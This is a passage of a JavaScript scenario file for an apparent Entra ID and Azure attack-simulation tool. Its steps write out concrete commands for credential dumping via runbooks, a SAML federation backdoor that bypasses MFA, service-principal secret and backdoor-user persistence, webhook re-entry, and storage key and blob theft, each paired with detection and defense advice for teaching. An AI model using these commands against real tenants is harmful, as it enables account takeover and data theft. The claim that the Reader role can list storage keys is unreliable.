    logMessage: "Prerequisite: Attacker has compromised a principal with Azure RBAC 'Automation Contributor', 'Contributor', or 'Owner' scoped to the Automation Account, resource group, or subscription. 'Automation Operator' and 'Automation Job Operator' cannot create or edit runbooks — only execute existing ones.",
    logType: "setup",
    action: () => { highlightElement("ent_admin", undefined, "compromised"); highlightElement("ent_mi"); },
  },
  {
    logMessage: "Recon: enumerate Automation Accounts and their credential assets. GET https://management.azure.com/subscriptions/{subId}/providers/Microsoft.Automation/automationAccounts?api-version=2023-11-01. Then GET .../automationAccounts/{name}/credentials?api-version=2023-11-01 — returns credential names but NOT passwords.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_mi", "azurerm", "List credential assets"),
  },
  {
    logMessage: "Create malicious runbook via portal or REST: PUT .../runbooks/exfil-creds { runbookType: 'PowerShell', description: '' }. Then publish draft content — a PUT to the draft endpoint with the PowerShell payload.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_mi", "azurerm", "Create runbook"),
  },
  {
    logMessage: "Runbook payload (PowerShell 5.1 or 7.4): $cred = Get-AutomationPSCredential -Name 'TargetCredential'; Write-Output $cred.UserName; Write-Output $cred.GetNetworkCredential().Password. Get-AutomationPSCredential (Orchestrator.AssetManagement.Cmdlets) decrypts the credential asset at runtime — no access to the encryption key required by the attacker.",
    logType: "attack",
    action: () => highlightElement("ent_mi"),
  },
  {
    logMessage: "Start the job: POST .../runbooks/exfil-creds/draft/testJob or publish then POST .../jobs. Job runs in the Automation Account sandbox. Output stream contains plaintext username and password. Retrieve: GET .../jobs/{jobId}/streams?streamType=Output.",
    logType: "azurerm",
    action: () => { highlightElement("ent_mi", undefined, "compromised"); addTemporaryEdge("ent_mi", "ent_attacker", "azurerm", "Job output: plaintext creds"); },
  },
  {
    logMessage: "Clean-up attempt: attacker deletes the runbook via DELETE .../runbooks/exfil-creds. However, the Azure Activity Log retains the create, publish, and job execution events. Job logs (including output stream) are retained for 30 days in the Automation Account by default. Deletion of the runbook does not delete job history.",
    logType: "info",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "DETECTION: Azure Activity Log — Microsoft.Automation/automationAccounts/runbooks/write (creation), Microsoft.Automation/automationAccounts/jobs/write (execution). Alert on runbook creation by principals who have not done so before. Automation Account job stream output is also queryable via Log Analytics if diagnostic settings are configured.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: Any credential stored in Automation Account assets — service accounts, API keys, database passwords — is recoverable by anyone with runbook-creation rights. Mitigate: move secrets to Key Vault and reference them via Managed Identity from runbooks instead of Automation credential assets. Scope Automation Contributor tightly; prefer Automation Operator for those who only need to run existing runbooks.",
    logType: "attack",
    action: () => { highlightElement("ent_kv"); highlightElement("ent_mi"); },
  },
];

// ── 15. Entra Role / Azure RBAC Boundary Pivot ───────────────────
export const entraRoleRbacBoundaryPivotScenario = [
  {
    scenarioName: "Attack: Entra Role / Azure RBAC Boundary Pivot",
    logMessage: "Attacker Goal: Abuse confusion between Microsoft Entra directory roles and Azure RBAC resource roles. In 2026 these are still separate authorization systems: Entra roles govern users, groups, apps, and directory role assignments through Microsoft Graph; Azure RBAC governs Azure resources through Azure Resource Manager.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Key distinction: Global Administrator does not automatically have access to Azure subscriptions. To bridge from Entra to ARM, a GA must first call the elevateAccess action (POST /providers/Microsoft.Authorization/elevateAccess) which grants User Access Administrator at the root scope — a noisy, audited operation.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Prerequisite: Attacker compromises EntraAdmin. The account is over-concentrated: active Global Administrator in Entra ID and also Owner/User Access Administrator on the production subscription — the classic GA-dual-role anti-pattern.",
    logType: "setup",
    action: () => highlightElement("ent_admin", undefined, "compromised"),
  },
  {
    logMessage: "Path A - Directory plane: Attacker uses the Entra role through Microsoft Graph. GET /v1.0/roleManagement/directory/roleAssignments and /v1.0/users enumerates privileged principals, role-assignable groups, app owners, and service principals.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "Graph directory role recon"),
  },
  {
    logMessage: "Attacker persists in Entra ID: POST /v1.0/roleManagement/directory/roleAssignments assigns Privileged Role Administrator or Global Administrator to an attacker-controlled service principal. Azure RBAC Owner alone could not do this; this is directory-plane authority.",
    logType: "msgraph",
    action: () => { highlightElement("ent_svc", undefined, "compromised"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "Add Entra role assignment"); },
  },
  {
    logMessage: "Path B - Azure resource plane: Attacker switches to Azure Resource Manager. GET https://management.azure.com/subscriptions?api-version=2022-12-01 lists subscriptions visible to this principal. Azure RBAC role assignments, not Entra admin roles, decide what resources are returned.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "ARM subscription/resource recon"),
  },
  {
    logMessage: "With User Access Administrator or Owner at subscription scope, attacker creates an Azure RBAC assignment: PUT /subscriptions/{subId}/providers/Microsoft.Authorization/roleAssignments/{guid} grants Contributor or Key Vault Administrator to WebApp-MI. This is resource-plane privilege escalation.",
    logType: "azurerm",
    action: () => { highlightElement("ent_mi", undefined, "compromised"); addTemporaryEdge("ent_attacker", "ent_mi", "azurerm", "Assign Azure RBAC role"); },
  },
  {
    logMessage: "WebApp-MI now accesses Key Vault data plane using Azure RBAC: GET https://corp-kv.vault.azure.net/secrets/db-connstr?api-version=2025-07-01. The token is issued by Entra, but authorization is enforced by Key Vault / Azure RBAC on the resource.",
    logType: "azurerm",
    action: () => { highlightElement("ent_kv", undefined, "compromised"); addTemporaryEdge("ent_mi", "ent_kv", "azurerm", "GET secret"); },
  },
  {
    logMessage: "Bridge case: If attacker has only Global Administrator, they can attempt the documented elevate-access action. POST https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01 assigns User Access Administrator at root scope (/) to that same user, enabling Azure RBAC changes across tenant subscriptions.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "azurerm", "elevateAccess -> UAA /"),
  },
  {
    logMessage: "Detection: Correlate Entra audit logs for role assignment changes with Azure Activity Log events Microsoft.Authorization/elevateAccess/action and Microsoft.Authorization/roleAssignments/write. A single identity touching both planes in a short window is the signal this scenario is meant to teach.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "IMPACT: One compromised over-privileged account crosses from directory compromise to Azure resource compromise. Least privilege means separating Entra admins from Azure subscription owners, using PIM/JIT for both role systems, and auditing both sets of role assignments independently.",
    logType: "success",
    action: () => { highlightElement("ent_tenant"); highlightElement("ent_kv"); },
  },
];

// ── 16. Entra ID Federation Backdoor (Cloud-Only) ────────────────
export const entraFederationBackdoorScenario = [
  {
    scenarioName: "Attack: Entra ID Federation Backdoor (Cloud-Only Persistence)",
    logMessage: "Attacker Goal: Using a compromised privileged account, register a malicious federated domain in the tenant, set an ImmutableId on a target user, then forge SAML assertions to authenticate as any user — bypassing both passwords and MFA — as a durable persistence mechanism.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker controls an account with any of: Domain Name Administrator, Hybrid Identity Administrator, External Identity Provider Administrator, or Global Administrator. No on-premises infrastructure required — this is a cloud-only attack distinct from Golden SAML (which requires ADFS compromise).",
    logType: "setup",
    action: () => { highlightElement("ent_admin", stepDelay, "compromised"); },
  },
  {
    logMessage: "Step 1 — Set ImmutableId on target: MSOnline module (Set-MsolUser) retired March 30, 2025. 2026 path: Update-MgUser -UserId cole@corp.com -OnPremisesImmutableId 'attacker-chosen-base64-string'. ImmutableId is a freely writable attribute by admins — it links the cloud account to a synthetic on-prem identity for federation assertion matching.",
    logType: "attack",
    action: () => { highlightElement("ent_user2"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "Update-MgUser (ImmutableId)"); },
  },
  {
    logMessage: "Step 2 — Register malicious domain: Attacker acquires any domain (e.g. evil-corp.io). In Entra portal or via Graph POST /v1.0/domains with id='evil-corp.io', verifies with DNS TXT record. AADInternals: ConvertTo-AADIntBackdoor -AccessToken $at -DomainName 'evil-corp.io' — creates a federation trust with an attacker-controlled issuer URI and self-signed signing certificate stored on the attacker's machine.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "domain federation setup"),
  },
  {
    logMessage: "Step 3 — Forge SAML assertion and authenticate: AADInternals: Open-AADIntOffice365Portal -ImmutableID 'attacker-chosen-base64-string' -Issuer 'https://evil-corp.io/adfs/services/trust' -ByPassMFA $true. AADInternals generates a SAML 2.0 response signed with the attacker's private key. Entra ID validates it against the registered federation certificate — authentication succeeds.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "forged SAML assertion"),
  },
  {
    logMessage: "Entra ID → Attacker: full session as target user (cole@corp.com). No password prompt, no MFA challenge. All Conditional Access policies requiring MFA are satisfied because authentication via federated IdP is treated as a completed auth flow. Attacker can target any user — including Global Admins — by setting their ImmutableId first.",
    logType: "oidc",
    action: () => { highlightElement("ent_user2", stepDelay, "compromised"); highlightElement("ent_m365"); addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "session (no MFA)"); },
  },
  {
    logMessage: "Persistence value: federated domain persists in the tenant until explicitly removed. Attacker can return weeks or months later and re-authenticate as any user whose ImmutableId they've pre-set — without the original compromised account still being active. Multiple users can be pre-configured simultaneously.",
    logType: "attack",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "DETECTION: Entra audit logs: Domain additions (Microsoft.Directory/domains/create) and federation configuration changes (Microsoft.Directory/domains/federationConfiguration/update) are logged. Alert on new domain registrations by non-standard callers, and on ImmutableId mutations on cloud-only user objects (on-prem synced users should have ImmutableId set by Entra Connect, not by humans). Microsoft Sentinel: watch for federation backdoor indicator — 'cloud-only user with ImmutableId set' is anomalous.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "DEFENSE: Restrict Hybrid Identity Admin and Domain Name Admin roles to dedicated hardened accounts with PIM. Enforce CA policy requiring phishing-resistant MFA for domain and federation configuration changes. Monitor Graph audit log for onPremisesImmutableId writes on cloud-only user objects. Consider Privileged Identity Management approval workflows for federation changes. Regularly audit registered domains and federation configurations for unexpected entries.",
    logType: "info",
    action: () => highlightElement("ent_admin"),
  },
  {
    logMessage: "IMPACT: Durable, passwordless, MFA-bypassing access to any impersonated user in the tenant. Survives password resets and MFA re-registration — those controls are irrelevant when authentication routes through the federated trust. Attributed to SolarWinds breach (APT29). A single write to the federation config gives indefinite impersonation capability.",
    logType: "attack",
    action: () => { highlightElement("ent_admin"); highlightElement("ent_m365"); highlightElement("ent_tenant"); },
  },
];

// ── 17. Service Principal Abuse → Graph Permission Expansion → Backdoor User ─
export const entraSPGraphPermExpansionUserBackdoorScenario = [
  {
    scenarioName: "Attack: Service Principal Abuse — Graph Permission Expansion → Backdoor User Creation (APT29 Persistence)",
    logMessage: "Attacker Goal: Starting from a compromised Application Administrator session, backdoor an existing app registration by adding a client secret, grant the service principal expanded Microsoft Graph application permissions (User.ReadWrite.All, Directory.ReadWrite.All), authenticate headlessly as the SP, then create a net-new cloud user as a durable secondary persistence mechanism. Technique observed in APT29 SolarWinds campaign and subsequent Entra intrusions.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker holds a compromised session with Application Administrator role. This role can read all app registrations, add credentials, and grant admin consent for application permissions scoped to registered apps — without Global Administrator.",
    logType: "setup",
    action: () => highlightElement("ent_admin", undefined, "compromised"),
  },
  {
    logMessage: "Target selection: attacker enumerates app registrations via GET /v1.0/applications?$select=appId,displayName,requiredResourceAccess&$top=999. Selects an app with existing benign permissions (e.g. User.Read) to blend the credential addition into normal application lifecycle activity. The app's service principal objectId and appId (client ID) are noted.",
    logType: "msgraph",
    action: () => { highlightElement("ent_svc"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "GET /applications (recon)"); },
  },
  {
    logMessage: "Add client secret: POST /v1.0/applications/{app_objectId}/addPassword { passwordCredential: { displayName: 'telemetry-sync', endDateTime: '2027-12-31T00:00:00Z' } }. Azure CLI equivalent: az ad app credential reset --id <appId> --append --years 2. The --append flag preserves existing credentials so the application continues functioning and owners may not notice.",
    logType: "msgraph",
    action: () => { highlightElement("ent_svc", undefined, "compromised"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST /addPassword"); },
  },
  {
    logMessage: "MS Graph → Attacker: 200 OK { secretText: 'P8cK~...' }. Secret returned once only — never retrievable again via API. Attacker stores appId (client ID), tenantId, and new secret. The application now has two valid sets of credentials: original (unknown to owners) + backdoor.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Permission expansion — attacker uses Find-MgGraphCommand to identify what Graph application permissions are required for user creation: Find-MgGraphCommand -Command New-MgUser | Select-Object -ExpandProperty Permissions. Output: User.ReadWrite.All, Directory.ReadWrite.All. Attacker notes whether admin consent is required (isAdminConsentRequired: true for application permissions — it always is for these scopes).",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Grant admin consent: as the compromised Application Administrator, attacker opens the target app's API Permissions blade and clicks 'Grant admin consent for <tenant>'. Graph equivalent: POST /v1.0/servicePrincipals/{SP_objectId}/appRoleAssignments { principalId: <SP_objectId>, resourceId: <Graph_SP_objectId>, appRoleId: <User.ReadWrite.All_id> }. Application Administrator CAN grant consent for permissions scoped to tenant-registered apps; these Graph permissions target the Microsoft Graph resource SP, so in practice a Global Admin or Privileged Role Administrator is normally required. [Verify exact boundary in target tenant's CA / admin consent policy.]",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "POST /appRoleAssignments (admin consent)"),
  },
  {
    logMessage: "Service principal authentication — no user, no MFA: POST /oauth2/v2.0/token { grant_type=client_credentials, client_id=<appId>, client_secret=<backdoor_secret>, scope=https://graph.microsoft.com/.default }. PowerShell: $body = @{grant_type='client_credentials'; client_id=$appId; client_secret=$secret; scope='https://graph.microsoft.com/.default'}; $r = Invoke-RestMethod -Uri \"https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token\" -Method POST -Body $body; Connect-MgGraph -AccessToken $r.access_token.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "oidc", "client_credentials (no MFA)"),
  },
  {
    logMessage: "2026 CA nuance: Conditional Access for Workload Identities (Entra Workload Identities Premium, ~$3/workload/month) can apply location- and risk-based policies to this service principal's token issuance — but it cannot enforce interactive MFA because service principals have no second-factor capability. Without the premium license or an explicit CA policy targeting this SP, the client_credentials token issuance is unrestricted.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "Entra ID → Attacker: 200 OK { access_token (JWT, 1h, roles=[User.ReadWrite.All, Directory.ReadWrite.All], oid=<SP_objectId>) }. Token is silently renewable every hour indefinitely using the stored client secret — which never expires unless administrators rotate or revoke it.",
    logType: "oidc",
    action: () => addTemporaryEdge("ent_tenant", "ent_attacker", "oidc", "SP token (app roles)"),
  },
  {
    logMessage: "Backdoor user creation via Microsoft Graph PowerShell v2: $pw = @{password='Summer!2025$'; forceChangePasswordNextSignIn=$false}; New-MgUser -DisplayName 'Helpdesk Automation' -UserPrincipalName 'hdauto@corp.onmicrosoft.com' -PasswordProfile $pw -AccountEnabled -MailNickname 'hdauto'. The user lands in the tenant as a cloud-only member with no on-prem sync flag — blends with service accounts.",
    logType: "msgraph",
    action: () => { highlightElement("ent_user2", undefined, "compromised"); addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "New-MgUser (backdoor)"); },
  },
  {
    logMessage: "Optional privilege escalation: if attacker also has RoleManagement.ReadWrite.Directory (or Global Admin session), assign the new user Global Administrator or a targeted role via POST /v1.0/roleManagement/directory/roleAssignments. Without role assignment, the backdoor user has member-level access — still useful for M365 access, mail, SharePoint, and further Graph API calls.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "role assignment (optional)"),
  },
  {
    logMessage: "Persistence confirmed: attacker signs in as the new user (interactive or ROPC) and updates the password to one only they know. The SP backdoor + user account provide two independent re-entry paths: client_credentials with the stored secret, and password-based user sign-in. Removing either single path does not evict the attacker.",
    logType: "success",
    action: () => { highlightElement("ent_user2"); highlightElement("ent_m365"); addTemporaryEdge("ent_user2", "ent_m365", "oidc", "backdoor user session"); },
  },
  {
    logMessage: "DETECTION: Entra Audit Log — 'Add password credentials to application' (high-fidelity alert; correlate with the calling user's UPN). 'Consent to application' or 'Add app role assignment to service principal' for Graph permissions. 'Add user' events from a service principal caller (oid in sign-in log = SP objectId, not a human UPN) are highly anomalous — alert immediately. Microsoft Defender for Cloud Apps: App governance 'new credential added to app with User.ReadWrite.All or Directory.ReadWrite.All'.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "DEFENSE: (1) Require admin consent workflow approval for all Graph application permissions — removes self-service consent by Application Administrators. (2) Alert on any 'Add user' audit event where initiatedBy.app is non-null (SP-initiated user creation). (3) Enable Workload Identities Premium CA policies restricting client_credentials flows from unexpected IP ranges. (4) Scope Application Administrator role to specific app registrations via PIM resource-scoped assignments where possible. (5) Review all app registrations for recently added credentials (Entra portal: App registrations → Expiring credentials report).",
    logType: "info",
    action: () => highlightElement("ent_admin"),
  },
  {
    logMessage: "IMPACT: Two independent persistence paths (SP client secret + cloud user account) survive: password resets on the original compromised account, MFA policy changes, CA policy updates targeting users (CA for workload identities requires premium licensing and explicit SP targeting). Root cause is the combination of Application Administrator's credential-add right, permissive admin consent policy, and absence of alerting on SP-initiated directory writes. Attributed to APT29 (SolarWinds, 2020; subsequent Microsoft 365 intrusions, 2023–2024).",
    logType: "attack",
    action: () => { highlightElement("ent_svc"); highlightElement("ent_user2"); highlightElement("ent_m365"); },
  },
];

// ── 18. Automation Account Webhook Persistence → Backdoor User ────
export const entraAutomationWebhookPersistenceScenario = [
  {
    scenarioName: "Attack: Automation Account Webhook Persistence — Out-of-Band Re-Entry via Runbook Backdoor",
    logMessage: "Attacker Goal: Hijack or create an Azure Automation Account that has a Managed Identity with User Administrator rights in Entra ID. Plant a malicious runbook that creates a backdoor user account, then attach a webhook so the attacker can re-trigger user creation from the internet even after their original compromised account has been revoked.",
    logType: "attack",
    action: () => { highlightElement("ent_attacker"); highlightElement("ent_mi"); },
  },
  {
    logMessage: "Prerequisite: Attacker holds a session with Contributor or Owner on the Automation Account's resource group, or Automation Contributor on the account itself. Target: the Automation Account's system-assigned Managed Identity already has Entra User Administrator role — or the attacker has enough Azure RBAC to add that role assignment. Azure Automation Run As accounts are fully retired as of September 30, 2023; all modern automation identity flows use Managed Identity.",
    logType: "setup",
    action: () => { highlightElement("ent_mi", undefined, "compromised"); highlightElement("ent_admin", undefined, "compromised"); },
  },
  {
    logMessage: "Recon: AzureHound / ROADtools maps Automation Accounts whose Managed Identity has Entra directory roles or Azure RBAC role assignments. GET https://management.azure.com/subscriptions/{subId}/providers/Microsoft.Automation/automationAccounts?api-version=2023-11-01. Cross-reference Managed Identity objectIds against Entra role assignments via GET /v1.0/roleManagement/directory/roleAssignments?$filter=principalId eq '{mi_objectId}'.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_mi", "msgraph", "Enumerate AA → MI roles"),
  },
  {
    logMessage: "Ensure Managed Identity has User Administrator: az role assignment create --assignee-object-id <mi_objectId> --role 'User Access Administrator' --scope /subscriptions/{subId} — grants Azure RBAC. For Entra directory role: POST /v1.0/roleManagement/directory/roleAssignments { principalId: <mi_objectId>, roleDefinitionId: <UserAdministrator_roleId>, directoryScopeId: '/' }. Requires a privileged role or User Access Administrator in the calling session.",
    logType: "msgraph",
    action: () => addTemporaryEdge("ent_attacker", "ent_tenant", "msgraph", "Assign User Admin to MI"),
  },
  {
    logMessage: "Create malicious runbook (PowerShell 7.4 — 2026 recommended runtime; 5.1 still functional but legacy): PUT https://management.azure.com/.../runbooks/persist-backdoor { runbookType: 'PowerShell', location: '...' }. Publish draft content with payload via PATCH on the draft endpoint.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_mi", "azurerm", "PUT runbook payload"),
  },
  {
    logMessage: "2026 runbook payload (PowerShell 7.4, Microsoft Graph SDK — AzureAD module retired July 1, 2025; AzureRM module execution halted February 1, 2025): Connect-AzAccount -Identity; $token = (Get-AzAccessToken -ResourceUrl 'https://graph.microsoft.com').Token; Connect-MgGraph -AccessToken $token; $body = $WebhookData.RequestBody | ConvertFrom-Json; $pw = @{password=$body.password; forceChangePasswordNextSignIn=$false}; New-MgUser -DisplayName $body.displayName -UserPrincipalName $body.upn -PasswordProfile $pw -AccountEnabled -MailNickname $body.nick.",
    logType: "attack",
    action: () => highlightElement("ent_mi"),
  },
  {
    logMessage: "Attach webhook: POST https://management.azure.com/.../runbooks/persist-backdoor/webhooks { name: 'sync-callback', expiryTime: '2027-06-01T00:00:00Z', isEnabled: true }. Response includes the full webhook URL with embedded security token — returned ONCE, never retrievable again via API. Attacker records the URL offline on attacker infrastructure.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_mi", "azurerm", "Create webhook (URL one-time)"),
  },
  {
    logMessage: "Trigger (out-of-band, after original access is revoked): Invoke-RestMethod -Method POST -Uri $webhookUrl -Body (@{displayName='IT Support Bot'; upn='itsbot@corp.onmicrosoft.com'; password='Spring!2026$'; nick='itsbot'} | ConvertTo-Json) -ContentType 'application/json'. No tenant credentials needed — the URL contains the authentication token. TLS 1.2+ required (TLS 1.0/1.1 blocked since March 1, 2025).",
    logType: "attack",
    action: () => { addTemporaryEdge("ent_attacker", "ent_mi", "azurerm", "POST webhook → trigger job"); },
  },
  {
    logMessage: "Automation job executes under the Managed Identity context: Connect-AzAccount -Identity succeeds, Graph SDK obtains a token scoped to the MI's permissions, New-MgUser creates the backdoor account. Job output stream contains the new user's objectId. Attacker polls GET .../jobs/{jobId}/streams?streamType=Output to confirm success — though in practice, simply attempting to sign in as the new account suffices.",
    logType: "attack",
    action: () => { highlightElement("ent_user2", undefined, "compromised"); addTemporaryEdge("ent_mi", "ent_tenant", "msgraph", "New-MgUser via MI token"); },
  },
  {
    logMessage: "Persistence value: the webhook URL, stored off-tenant, is the attacker's independent re-entry trigger. It survives: revocation of the original compromised account, password resets, MFA changes, CA policy updates, and even removal of the attacker's added app credentials from earlier in the chain. Only disabling or deleting the webhook or the Automation Account itself cuts the mechanism.",
    logType: "attack",
    action: () => { highlightElement("ent_user2"); highlightElement("ent_m365"); addTemporaryEdge("ent_user2", "ent_m365", "oidc", "backdoor user session"); },
  },
  {
    logMessage: "DETECTION: Azure Activity Log — Microsoft.Automation/automationAccounts/runbooks/write (runbook creation or modification), Microsoft.Automation/automationAccounts/webhooks/write (webhook creation). Alert on new runbooks or webhooks created by principals who don't normally manage automation infrastructure. Automation job logs (including output stream) are retained 30 days by default; enable Log Analytics diagnostic settings to retain longer and query centrally. Entra audit log: 'Add user' events where initiatedBy.app.displayName is the Automation Account MI — this SP-initiated user creation is highly anomalous.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
    logMessage: "DEFENSE: (1) Scope Managed Identity role assignments to minimum required — prefer a custom role that allows only user creation in a specific OU/group rather than full User Administrator. (2) Enforce admin consent workflows that flag any SP (including Managed Identities) issuing New-MgUser calls. (3) Alert on Automation Account webhook creation; treat existing webhooks as long-lived secrets requiring periodic audit and rotation. (4) Use Azure Policy to require approval tags on Automation Account runbook publications. (5) Restrict Automation Contributor and Automation Operator roles with PIM. (6) Log all Automation job streams to Log Analytics; alert on output containing email-address-like strings (UPN creation indicator).",
    logType: "info",
    action: () => highlightElement("ent_admin"),
  },
  {
    logMessage: "IMPACT: A webhook URL stored off-tenant is a persistent, credential-free re-entry mechanism that survives complete credential rotation of all known compromised accounts. The automation infrastructure was intended for operational tasks but becomes an attacker-controlled executor with Entra write permissions. Root cause: over-privileged Managed Identity + absence of change-detection on runbook and webhook resources.",
    logType: "attack",
    action: () => { highlightElement("ent_mi"); highlightElement("ent_user2"); highlightElement("ent_tenant"); },
  },
];

// ── 19. Azure Storage Account Abuse — Key Theft, Blob Exfiltration, SAS URI ──
export const entraStorageAccountAbuseScenario = [
  {
    scenarioName: "Attack: Azure Storage Account Abuse — Key Extraction, Blob Exfiltration & SAS URI Misuse",
    logMessage: "Attacker Goal: Leverage a compromised account's management-plane Reader role to extract storage account access keys, then enumerate and download blobs (files) from any container. Separately model the anonymous-access and leaked-SAS-URI paths that still affect legacy storage accounts.",
    logType: "attack",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Prerequisite: Attacker holds a compromised session (token or password) for an account with at minimum Reader on the target subscription or resource group. Reader is a management-plane role, but it implicitly includes Microsoft.Storage/storageAccounts/listKeys/action — enough to extract 512-bit symmetric storage keys. No data-plane RBAC role (Storage Blob Data Reader) is required for this path.",
    logType: "setup",
    action: () => { highlightElement("ent_user1", undefined, "compromised"); highlightElement("ent_kv"); },
  },
  {
    logMessage: "Enumerate storage accounts: az storage account list --subscription <subId> --query '[].{name:name, blobEndpoint:primaryEndpoints.blob}'. Returns all storage account names and their public DNS endpoints (e.g. storageevil.blob.core.windows.net). Equivalent ARM call: GET /subscriptions/{subId}/providers/Microsoft.Storage/storageAccounts?api-version=2023-05-01.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "List storage accounts"),
  },
  {
    logMessage: "Extract storage access keys: az storage account keys list --subscription <subId> --account-name storageevil --resource-group <rg>. Returns two 512-bit base64-encoded symmetric keys (key1, key2). These keys grant full data-plane control: read, write, delete, create containers, generate SAS tokens — with no MFA and no Entra CA evaluation. Storage account keys are still enabled by default on new accounts in 2026; organizations must explicitly set AllowSharedKeyAccess=false to prevent this path.",
    logType: "azurerm",
    action: () => { highlightElement("ent_kv", undefined, "compromised"); addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "GET /listKeys → key1,key2"); },
  },
  {
    logMessage: "Enumerate containers: az storage container list --subscription <subId> --account-name storageevil --account-key <key1>. Lists all containers (directories) in the storage account — e.g. 'mysecret', 'backups', 'logs'. No additional permission check: possession of the account key bypasses all Entra data-plane RBAC.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "Container enum"),
  },
  {
    logMessage: "Enumerate and download blobs: az storage blob list --subscription <subId> --account-name storageevil --account-key <key1> --container-name mysecret. Returns filenames, sizes, last-modified timestamps. Download: az storage blob download --account-name storageevil --account-key <key1> --container-name mysecret --name secret-config.json --file /tmp/out.json. All blobs in all containers are accessible with the account key.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_kv", "ent_attacker", "azurerm", "Blob download → exfil"),
  },
  {
    logMessage: "SAS token generation (persistent delegated access): az storage blob generate-sas --subscription <subId> --account-name storageevil --account-key <key1> --container-name mysecret --name secret-config.json --permissions r --expiry 2027-12-31T00:00:00Z. Produces a time-bounded signed URL. The URL: https://storageevil.blob.core.windows.net/mysecret/secret-config.json?sv=2023-08-03&se=...&sig=... allows unauthenticated download by anyone who possesses it — no Entra session required. Leaking this URL (e.g. in logs, git commits, Slack) is equivalent to leaking the file itself.",
    logType: "azurerm",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "Generate SAS URI"),
  },
  {
    logMessage: "SAS URI reuse via Azure Storage Explorer: connect with DefaultEndpointsProtocol=https;AccountName=storageevil;AccountKey=<key1> or with a SAS connection string. Provides GUI access to all containers and blobs; supports upload, download, delete, and tier changes. Azure Storage Explorer v1.43.0 (April 2026) still fully supports shared key and SAS authentication alongside Entra ID.",
    logType: "azurerm",
    action: () => highlightElement("ent_attacker"),
  },
  {
    logMessage: "Anonymous public access path (legacy storage accounts only): prior to August 2023, new Azure storage accounts allowed containers to be set to 'Public read access for blobs only' or 'Public read access for container and blobs'. Storage accounts created after August 2023 have allowBlobPublicAccess disabled by default. Legacy accounts still require manual remediation. Where anonymous access persists: Invoke-WebRequest -Uri 'https://storageevil.blob.core.windows.net/mysecret/hacked.png' -OutFile hacked.png — no credentials required if the container is public.",
    logType: "info",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "Anonymous blob fetch (legacy)"),
  },
  {
    logMessage: "Leaked SAS URI discovery: attackers search GitHub, Pastebin, and public code repos for SAS patterns — sv=, se=, sig=, spr=https. Tools like truffleHog, gitleaks, and GitHub Advanced Security secret scanning detect SAS URIs in code history. A leaked SAS URI grants access for its entire validity window (up to expiry) with no way to revoke without rotating the underlying account key or the user-delegation credential used to sign it.",
    logType: "attack",
    action: () => addTemporaryEdge("ent_attacker", "ent_kv", "azurerm", "SAS URI from GitHub leak"),
  },
  {
    logMessage: "DETECTION: Azure Storage diagnostic logs (enable in Diagnostic Settings → StorageRead, StorageWrite, StorageDelete categories to Log Analytics): captures blob read/write operations with caller IP, operation type, and authentication type (SharedKey vs SAS vs Entra). Azure Activity Log: Microsoft.Storage/storageAccounts/listKeys/action is logged — alert on any principal invoking listKeys who is not a designated storage administrator. Microsoft Defender for Storage: anomalous blob access patterns, unusual enumeration volume, access from Tor/VPN exit nodes.",
    logType: "info",
    action: () => highlightElement("ent_tenant"),
  },
  {
